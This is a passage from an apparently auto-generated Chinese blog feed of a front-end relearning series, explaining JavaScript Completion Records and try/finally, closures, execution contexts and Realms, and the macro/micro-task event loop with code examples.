class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">foo</span>());</span><br></pre></td></tr></table></figure><p>很明，finally 确实执行了，而且 return 语句也生效了，foo() 返回了结果 0。</p><p>虽然 return 执行了，但是函数并没有立即返回，又执行了 finally 里面的内容，这样的行为违背了很多人的直觉。</p><p>如果在这个例子中，我们在 finally 中加入 return 语句，会发生什么呢？</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">foo</span>());</span><br></pre></td></tr></table></figure><p>通过实际执行，我们看到，<code>finally</code> 中的 <code>return</code> “覆盖”了 <code>try</code> 中的 <code>return</code>。在一个函数中执行了两次 <code>return</code>，这已经超出了很多人的常识，也是其它语言中不会出现的一种行为。</p><p>面对如此怪异的行为，我们当然可以把它作为一个孤立的知识去记忆，但是实际上，这背后有一套机制在运作。</p><p>这一机制的基础正是 <code>JavaScript</code> 语句执行的完成状态，我们用一个标准类型来表示：<strong>Completion Record</strong>（Completion Record 用于描述异常、跳出等语句执行过程）。</p><h3 id="Completion-Record-表示一个语句执行完之后的结果，它有三个字段："><a href="#Completion-Record-表示一个语句执行完之后的结果，它有三个字段：" class="headerlink" title="Completion Record 表示一个语句执行完之后的结果，它有三个字段："></a>Completion Record 表示一个语句执行完之后的结果，它有三个字段：</h3><ul><li>[[type]] 表示完成的类型，有 break continue return throw 和 normal 几种类型；</li><li>[[value]] 表示语句的返回值，如果语句没有，则是 <code>empty</code>；</li><li>[[target]] 表示语句的目标，通常是一个 <code>JavaScript</code> 标签（标签在后文会有介绍）。</li></ul><blockquote><p>JavaScript 正是依靠语句的 Completion Record 类型，方才可以在语句的复杂嵌套结构中，实现各种控制。接下来我们要来了解一下 JavaScript 使用 Completion Record 类型，控制语句执行的过程。</p></blockquote><p>首先我们来看看语句有几种分类。</p><p><img src="/Blog/2019/01/29/relearn_FE/06%E4%B8%A8JavaScript-try%E9%87%8C%E9%9D%A2%E6%94%BEreturn%EF%BC%8Cfinally%E8%BF%98%E4%BC%9A%E6%89%A7%E8%A1%8C%E5%90%97%EF%BC%9F/index/img.png"></p><h4 id="普通的语句"><a href="#普通的语句" class="headerlink" title="普通的语句"></a>普通的语句</h4><blockquote><p>在 JavaScript 中，我们把不带控制能力的语句称为普通语句。普通语句有下面几种。</p></blockquote><p>普通语句执行后，会得到 [[type]] 为 <code>normal</code> 的 <code>Completion Record</code>，<code>JavaScript</code> 引擎遇到这样的 <code>Completion Record</code>，会继续执行下一条语句。</p><p>这些语句中，只有表达式语句会产生 [[value]]，当然，从引擎控制的角度，这个 <code>value</code> 并没有什么用处。</p><p>如果你经常使用 <code>chrome</code> 自带的调试工具，可以知道，输入一个表达式，在控制台可以得到结果，但是在前面加上 <code>var</code>，就变成了 <code>undefined</code>。</p><p><img src="/Blog/2019/01/29/relearn_FE/06%E4%B8%A8JavaScript-try%E9%87%8C%E9%9D%A2%E6%94%BEreturn%EF%BC%8Cfinally%E8%BF%98%E4%BC%9A%E6%89%A7%E8%A1%8C%E5%90%97%EF%BC%9F/index/img_1.png"></p><blockquote><p>Chrome 控制台显示的正是语句的 Completion Record 的 [[value]]。</p></blockquote><h4 id="语句块"><a href="#语句块" class="headerlink" title="语句块"></a>语句块</h4><blockquote><p>语句块就是拿大括号括起来的一组语句，它是一种语句的复合结构，可以嵌套</p></blockquote><p>语句块本身并不复杂，我们需要注意的是语句块内部的语句的 <code>Completion Record</code> 的 [[type]] 如果不为 <code>normal</code>，会打断语句块后续的语句执行。</p><p>比如我们考虑，一个 [[type]] 为 <code>return</code> 的语句，出现在一个语句块中的情况。</p><p>从语句的这个 <code>type</code> 中，我们大概可以猜到它由哪些特定语句产生，我们就来说说最开始的例子中的 <code>return</code>。</p><p><code>return</code> 语句可能产生 <code>return</code> 或者 <code>throw</code> 类型的 <code>Completion Record</code>。我们来看一个例子。</p><p>先给出一个内部为普通语句的语句块：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">var</span> i = <span class="number">1</span>; <span class="comment">// normal, empty, empty</span></span><br><span class="line">  <span class="keyword">return</span> i; <span class="comment">// return, 1, empty</span></span><br><span class="line">  i ++; </span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(i)</span><br><span class="line">&#125; <span class="comment">// return, 1, empty</span></span><br></pre></td></tr></table></figure><p>但是假如我们在 block 中插入了一条 return 语句，产生了一个非 normal 记录，那么整个 block 会成为非 normal。这个结构就保证了非 normal 的完成类型可以穿透复杂的语句嵌套结构，产生控制效果。</p><h4 id="控制型语句"><a href="#控制型语句" class="headerlink" title="控制型语句"></a>控制型语句</h4><blockquote><p>控制型语句带有 <code>if</code>、<code>switch</code> 关键字，它们会对不同类型的 <code>Completion Record</code> 产生反应。</p></blockquote><p>控制类语句分成两部分，一类是对其内部造成影响，如 <code>if、switch、while/for、try</code>。另一类是对外部造成影响如 <code>break、continue、return、throw</code>，这两类语句的配合，会产生控制代码执行顺序和执行逻辑的效果，这也是我们编程的主要工作。</p><p>一般来说， <code>for/while - break/continue</code> 和 <code>try - throw</code> 这样比较符合逻辑的组合，是大家比较熟悉的，但是，实际上，我们需要控制语句跟 <code>break 、continue 、return 、throw</code> 四种类型与控制语句两两组合产生的效果。</p><p><img src="/Blog/2019/01/29/relearn_FE/06%E4%B8%A8JavaScript-try%E9%87%8C%E9%9D%A2%E6%94%BEreturn%EF%BC%8Cfinally%E8%BF%98%E4%BC%9A%E6%89%A7%E8%A1%8C%E5%90%97%EF%BC%9F/index/img_2.png"></p><p>通过这个表，我们不难发现知识的盲点，也就是我们最初的的 <code>case</code> 中的 <code>try</code> 和 <code>return</code> 的组合了。</p><p>因为 <code>finally</code> 中的内容必须保证执行，所以 <code>try/catch</code> 执行完毕，即使得到的结果是非 <code>normal</code> 型的完成记录，也必须要执行 <code>finally</code>。</p><p>而当 <code>finally</code> 执行也得到了非 <code>normal</code> 记录，则会使 <code>finally</code> 中的记录作为整个 <code>try</code> 结构的结果。</p><h4 id="带标签的语句"><a href="#带标签的语句" class="headerlink" title="带标签的语句"></a>带标签的语句</h4><blockquote><p>实际上，任何 JavaScript 语句是可以加标签的，在语句前加冒号即可：</p></blockquote><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firstStatement: <span class="keyword">var</span> i = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>大部分时候，这个东西类似于注释，没有任何用处。唯一有作用的时候s是：与完成记录类型中的 <code>target</code> 相配合，用于跳出多层循环。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">outer</span>: <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">  <span class="keyword">inner</span>: <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">      break <span class="keyword">outer</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">console.log(&quot;finished&quot;)</span><br></pre></td></tr></table></figure><p><code>break/continue</code> 语句如果后跟了关键字，会产生带 <code>target</code> 的完成记录。一旦完成记录带了 <code>target</code>，那么只有拥有对应 <code>label</code> 的循环语句会消费它。</p>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>05丨JavaScript-闭包</title>
      <link href="/Blog/2019/01/29/relearn_FE/05%E4%B8%A8JavaScript-%E9%97%AD%E5%8C%85/index/"/>
      <url>/Blog/2019/01/29/relearn_FE/05%E4%B8%A8JavaScript-%E9%97%AD%E5%8C%85/index/</url>
      
        <content type="html"><![CDATA[<h2 id="函数的执行"><a href="#函数的执行" class="headerlink" title="函数的执行"></a>函数的执行</h2><p>我们今天要讲的知识在网上有不同的名字，比较常见的可能有：</p><ul><li>闭包；</li><li>作用域链；</li><li>执行上下文；</li><li>this 值。</li></ul><p>实际上，尽管它们是表示不同的意思的术语，所指向的几乎是同一部分知识，那就是函数执行过程相关的知识。我们可以简单看一下图。</p><p><img src="/Blog/2019/01/29/relearn_FE/05%E4%B8%A8JavaScript-%E9%97%AD%E5%8C%85/index/img.png"></p><h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>闭包翻译自英文单词 closure，这是个不太好翻译的词，在计算机领域，它就有三个完全不相同的意义：编译原理中，它是处理语法产生式的一个步骤；计算几何中，它表示包裹平面点集的凸多边形（翻译作凸包）；而在编程语言领域，它表示一种函数。</p><p>闭包这个概念第一次出现在 1964 年的《The Computer Journal》上，由 P. J. Landin 在《The mechanical evaluation of expressions》一文中提出了 applicative expression 和 closure 的概念。</p><p><img src="/Blog/2019/01/29/relearn_FE/05%E4%B8%A8JavaScript-%E9%97%AD%E5%8C%85/index/img_1.png"></p><p>在上世纪 60 年代，主流的编程语言是基于 lambda 演算的函数式编程语言，所以这个最初的闭包定义，使用了大量的函数式术语。一个不太精确的描述是“带有一系列信息的λ表达式”。对函数式语言而言，λ表达式其实就是函数。</p><p>我们可以这样简单理解一下，<strong>闭包其实只是一个绑定了执行环境的函数</strong>，这个函数并不是印在书本里的一条简单的表达式，闭包与普通函数的区别是，它携带了执行的环境，就像人在外星中需要自带吸氧的装备一样，这个函数也带有在程序中生存的环境。</p><p>这个古典的闭包定义中，闭包包含两个部分。</p><ul><li>环境部分<ul><li>环境</li><li>标识符列表</li></ul></li><li>表达式部分</li></ul><p>当我们把视角放在 JavaScript 的标准中，我们发现，标准中并没有出现过 closure 这个术语，但是，我们却不难根据古典定义，在 JavaScript 中找到对应的闭包组成部分。</p><ul><li>环境部分<ul><li>环境：函数的词法环境（执行上下文的一部分）</li><li>标识符列表：函数中用到的未声明的变量</li></ul></li><li>表达式部分：函数体</li></ul><p>至此，我们可以认为，JavaScript 中的函数完全符合闭包的定义。它的环境部分是函数词法环境部分组成，它的标识符列表是函数中用到的未声明变量，它的表达式部分就是函数体。</p><h2 id="执行上下文：执行的基础设施"><a href="#执行上下文：执行的基础设施" class="headerlink" title="执行上下文：执行的基础设施"></a>执行上下文：执行的基础设施</h2><p>相比普通函数，JavaScript 函数的主要复杂性来自于它携带的“环境部分”。当然，发展到今天的 JavaScript，它所定义的环境部分，已经比当初经典的定义复杂了很多。</p><p>JavaScript 中与闭包“环境部分”相对应的术语是“词法环境”，但是 JavaScript 函数比λ函数要复杂得多，我们还要处理 this、变量声明、with 等等一系列的复杂语法，λ函数中可没有这些东西，所以，在 JavaScript 的设计中，词法环境只是 JavaScript 执行上下文的一部分。</p><p>JavaScript 标准把一段代码（包括函数），执行所需的所有信息定义为：“执行上下文”。</p><p>因为这部分术语经历了比较多的版本和社区的演绎，所以定义比较混乱，这里我们先来理一下 JavaScript 中的概念。</p><p><strong>执行上下文在 ES3 中</strong>，包含三个部分。</p><ul><li>scope：作用域，也常常被叫做作用域链。</li><li>variable object：变量对象，用于存储变量的对象。</li><li>this value：this 值。</li></ul><p><strong>在 ES5 中</strong>，我们改进了命名方式，把执行上下文最初的三个部分改为下面这个样子。</p><ul><li>lexical environment：词法环境，当获取变量时使用。</li><li>variable environment：变量环境，当声明变量时使用。</li><li>this value：this 值。</li></ul><p><strong>在 ES2018 中</strong>，执行上下文又变成了这个样子，this 值被归入 lexical environment，但是增加了不少内容。</p><ul><li>lexical environment：词法环境，当获取变量或者 this 值时使用。</li><li>variable environment：变量环境，当声明变量时使用。</li><li>code evaluation state：用于恢复代码执行位置。</li><li>Function：执行的任务是函数时使用，表示正在被执行的函数。</li><li>ScriptOrModule：执行的任务是脚本或者模块时使用，表示正在被执行的代码。</li><li>Realm：使用的基础库和内置对象实例。</li><li>Generator：仅生成器上下文有这个属性，表示当前生成器。</li></ul><p>我们在这里介绍执行上下文的各个版本定义，是考虑到你可能会从各种网上的文章中接触这些概念，如果不把它们理清楚，我们就很难分辨对错。如果是我们自己使用，我建议统一使用最新的 ES2018 中规定的术语定义。</p><h3 id="var-声明与赋值"><a href="#var-声明与赋值" class="headerlink" title="var 声明与赋值"></a>var 声明与赋值</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var b<span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>通常我们认为它声明了 b，并且为它赋值为 1，var 声明作用域函数执行的作用域。也就是说，var 会穿透 for 、if 等语句。</p><p>在只有 var，没有 let 的旧 JavaScript 时代，诞生了一个技巧，叫做：立即执行的函数表达式（IIFE），通过创建一个函数，并且立即执行，来构造一个新的域，从而控制 var 的范围。</p><p>由于语法规定了 function 关键字开头是函数声明，所以要想让函数变成函数表达式，我们必须得加点东西，最常见的做法是加括号或者分号。</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a;</span><br><span class="line">    <span class="comment">//code</span></span><br><span class="line">&#125;());</span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a;</span><br><span class="line">    <span class="comment">//code</span></span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">;(<span class="keyword">function</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a;</span><br><span class="line">    <span class="comment">//code</span></span><br><span class="line">&#125;())</span><br><span class="line"></span><br><span class="line">;(<span class="keyword">function</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a;</span><br><span class="line">    <span class="comment">//code</span></span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><p><strong>我比较推荐的写法是使用 void 关键字。也就是下面的这种形式。</strong></p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="keyword">function</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a;</span><br><span class="line">    <span class="comment">//code</span></span><br><span class="line">&#125;();</span><br></pre></td></tr></table></figure><p>这有效避免了语法问题，同时，语义上 void 运算表示忽略后面表达式的值，变成 undefined，我们确实不关心 IIFE 的返回值，所以语义也更为合理。</p><p>值得特别注意的是，有时候 var 的特性会导致声明的变量和被赋值的变量是两个 b，JavaScript 中有特例，那就是使用 with 的时候：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> b;</span><br><span class="line"><span class="keyword">void</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> env = &#123;<span class="attr">b</span>:<span class="number">1</span>&#125;;</span><br><span class="line">    b = <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;In function b:&quot;</span>, b);</span><br><span class="line">    with(env) &#123;</span><br><span class="line">        <span class="keyword">var</span> b = <span class="number">3</span>;</span><br><span class="line">        <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;In with b:&quot;</span>, b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;();</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;Global b:&quot;</span>, b);</span><br></pre></td></tr></table></figure><p>可以看到，在 Global function with 三个环境中，b 的值都不一样，而在 function 环境中，并没有出现 var b，这说明 with 内的 var b 作用到了 function 这个环境当中。</p><p>var b &#x3D; {} 这样一句对两个域产生了作用，从语言的角度是个非常糟糕的设计，这也是一些人坚定地反对在任何场景下使用 with 的原因之一。</p><blockquote><p>ps: 怎么理解上面那段函数</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> b;</span><br><span class="line"><span class="keyword">void</span> <span class="keyword">function</span>(<span class="params"></span>)&#123; </span><br><span class="line">    <span class="keyword">var</span> env = &#123;<span class="attr">b</span>:<span class="number">1</span>&#125;;</span><br><span class="line">    b = <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;In function b:&quot;</span>, b);</span><br><span class="line">&#125;();</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;Global b:&quot;</span>, b); <span class="comment">// 结果是2 2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b;</span><br><span class="line"><span class="keyword">void</span> <span class="keyword">function</span>(<span class="params"></span>)&#123; </span><br><span class="line">    <span class="keyword">var</span> env = &#123;<span class="attr">b</span>:<span class="number">1</span>&#125;;</span><br><span class="line">    b = <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;In function b:&quot;</span>, b);</span><br><span class="line">    <span class="keyword">var</span> b = <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(b);</span><br><span class="line">&#125;();</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;Global b:&quot;</span>, b); <span class="comment">// 结果是 2 3 undefined</span></span><br><span class="line"><span class="comment">// 因为函数中的var b 会被申明提前 等价于</span></span><br><span class="line"><span class="keyword">var</span> b;</span><br><span class="line"><span class="keyword">void</span> <span class="keyword">function</span>(<span class="params"></span>)&#123; </span><br><span class="line">    <span class="keyword">var</span> b </span><br><span class="line">    b = <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;In function b:&quot;</span>, b); <span class="comment">// 2</span></span><br><span class="line">    b = <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(b); <span class="comment">//3</span></span><br><span class="line">&#125;();</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;Global b:&quot;</span>, b); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure></blockquote><h3 id="let"><a href="#let" class="headerlink" title="let"></a>let</h3><p>let 是 ES6 开始引入的新的变量声明模式，比起 var 的诸多弊病，let 做了非常明确的梳理和规定。</p><p>为了实现 let，JavaScript 在运行时引入了块级作用域。也就是说，在 let 出现之前，JavaScript 的 if for 等语句皆不产生作用域。</p><p>我简单统计了下，以下语句会产生 let 使用的作用域：</p><ul><li>for；</li><li>if；</li><li>switch；</li><li>try&#x2F;catch&#x2F;finally。</li></ul><h3 id="Realm"><a href="#Realm" class="headerlink" title="Realm"></a>Realm</h3><p>在最新的标准（9.0）中，JavaScript 引入了一个新概念 Realm</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">var</span> <span class="selector-tag">b</span> = &#123;&#125;</span><br></pre></td></tr></table></figure><p>在 ES2016 之前的版本中，标准中甚少提及{}的原型问题。但在实际的前端开发中，通过 iframe 等方式创建多 window 环境并非罕见的操作，所以，这才促成了新概念 Realm 的引入。</p><p>Realm 中包含一组完整的内置对象，而且是复制关系。</p><p>对不同 Realm 中的对象操作，会有一些需要格外注意的问题，比如 instanceOf 几乎是失效的。</p><p>以下代码展示了在浏览器环境中获取来自两个 Realm 的对象，它们跟本土的 Object 做 instanceOf 时会产生差异：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>)</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="title function_">appendChild</span>(iframe)</span><br><span class="line">iframe.<span class="property">src</span>=<span class="string">&quot;javascript:var b = &#123;&#125;;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b1 = iframe.<span class="property">contentWindow</span>.<span class="property">b</span>;</span><br><span class="line"><span class="keyword">var</span> b2 = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> b1, <span class="keyword">typeof</span> b2); <span class="comment">//object object</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b1 <span class="keyword">instanceof</span> <span class="title class_">Object</span>, b2 <span class="keyword">instanceof</span> <span class="title class_">Object</span>); <span class="comment">//false true</span></span><br></pre></td></tr></table></figure><p>可以看到，由于 b1、 b2 由同样的代码“ {} ”在不同的 Realm 中执行，所以表现出了不同的行为。</p>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>04丨JavaScript-eventLoop</title>
      <link href="/Blog/2019/01/29/relearn_FE/04%E4%B8%A8JavaScript-eventLoop/index/"/>
      <url>/Blog/2019/01/29/relearn_FE/04%E4%B8%A8JavaScript-eventLoop/index/</url>
      
        <content type="html"><![CDATA[<p>在 ES3 和更早的版本中，JavaScript 本身还没有异步执行代码的能力，这也就意味着，宿主环境传递给 JavaScript 引擎一段代码，引擎就把代码直接顺次执行了，这个任务也就是宿主发起的任务。</p><p>但是，在 ES5 之后，JavaScript 引入了 Promise，这样，不需要浏览器的安排，JavaScript 引擎本身也可以发起任务了。</p><blockquote><p>由于我们这里主要讲 JavaScript 语言，那么采纳 JSC 引擎的术语，我们把<strong>宿主发起的任务称为宏观任务</strong>，把 <strong>JavaScript 引擎发起的任务称为微观任务</strong>。</p></blockquote><h1 id="宏观和微观任务"><a href="#宏观和微观任务" class="headerlink" title="宏观和微观任务"></a>宏观和微观任务</h1><blockquote><p>JavaScript 引擎等待宿主环境分配宏观任务，在操作系统中，通常等待的行为都是一个事件循环，所以在 Node 术语中，也会把这个部分称为事件循环。</p></blockquote><p>这里每次的循环的过程，其实都是一个宏观任务。我们可以大概理解：宏观任务的队列就相当于事件循环。</p><p>在宏观任务中，JavaScript 的 Promise 还会产生异步代码，JavaScript 必须保证这些异步代码在一个宏观任务中完成，因此，每个宏观任务中又包含了一个微观任务队列：</p><p><img src="/Blog/2019/01/29/relearn_FE/04%E4%B8%A8JavaScript-eventLoop/index/img.png"></p><p>有了宏观任务和微观任务机制，我们就可以实现 JS 引擎级和宿主级的任务了，例如：Promise 永远在队列尾部添加微观任务。setTimeout 等宿主 API，则会添加宏观任务。</p><h4 id="我们来看端代码"><a href="#我们来看端代码" class="headerlink" title="我们来看端代码"></a>我们来看端代码</h4><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> r = <span class="keyword">new</span> Promise(<span class="keyword">function</span>(<span class="params">resolve, reject</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">    resolve()</span><br><span class="line">&#125;);</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;d&quot;</span>), <span class="number">0</span>)</span><br><span class="line">r.then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;c&quot;</span>));</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;b&quot;</span>)</span><br></pre></td></tr></table></figure><p>我们发现，不论代码顺序如何，d 必定发生在 c 之后，因为 Promise 产生的是 JavaScript 引擎内部的微任务，而 setTimeout 是浏览器 API，它产生宏任务。</p><p>为了理解微任务始终先于下一个宏任务，我们设计一个实验：执行一个耗时 1 秒的 Promise。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;d&quot;</span>), <span class="number">0</span>)</span><br><span class="line"><span class="keyword">var</span> r = <span class="keyword">new</span> Promise(<span class="keyword">function</span>(<span class="params">resolve, reject</span>)&#123;</span><br><span class="line">    resolve()</span><br><span class="line">&#125;);</span><br><span class="line">r.then(<span class="function"><span class="params">()</span> =&gt;</span> &#123; </span><br><span class="line">    <span class="keyword">var</span> begin = <span class="built_in">Date</span>.<span class="built_in">now</span>();</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">Date</span>.<span class="built_in">now</span>() - begin &lt; <span class="number">1000</span>);</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;c1&quot;</span>) </span><br><span class="line">    <span class="keyword">new</span> Promise(<span class="keyword">function</span>(<span class="params">resolve, reject</span>)&#123;</span><br><span class="line">        resolve()</span><br><span class="line">    &#125;).then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;c2&quot;</span>))</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这里我们强制了 1 秒的执行耗时，这样，我们可以确保任务 c2 是在 d 之后被添加到任务队列。</p><p>我们可以看到，即使耗时一秒的 c1 执行完毕，再 enque 的 c2，仍然先于 d 执行了，这很好地解释了微任务优先的原理。</p><p>通过一系列的实验，我们可以总结一下如何分析异步执行的顺序：</p><ul><li>首先我们分析有多少个宏任务；</li><li>在每个宏任务中，分析有多少个微任务；</li><li>根据调用次序，确定宏任务中的微任务执行次序；</li><li>根据宏任务的触发规则和调用次序，确定宏任务的执行次序；</li><li>确定整个顺序。</li></ul><h4 id="再看两个难一点的🌰"><a href="#再看两个难一点的🌰" class="headerlink" title="再看两个难一点的🌰"></a>再看两个难一点的🌰</h4><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">async <span class="keyword">function</span> <span class="title function_">t1</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">1</span>)</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">2</span>)</span><br><span class="line">  await Promise.resolve().then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;t1p&#x27;</span>))</span><br><span class="line">  <span 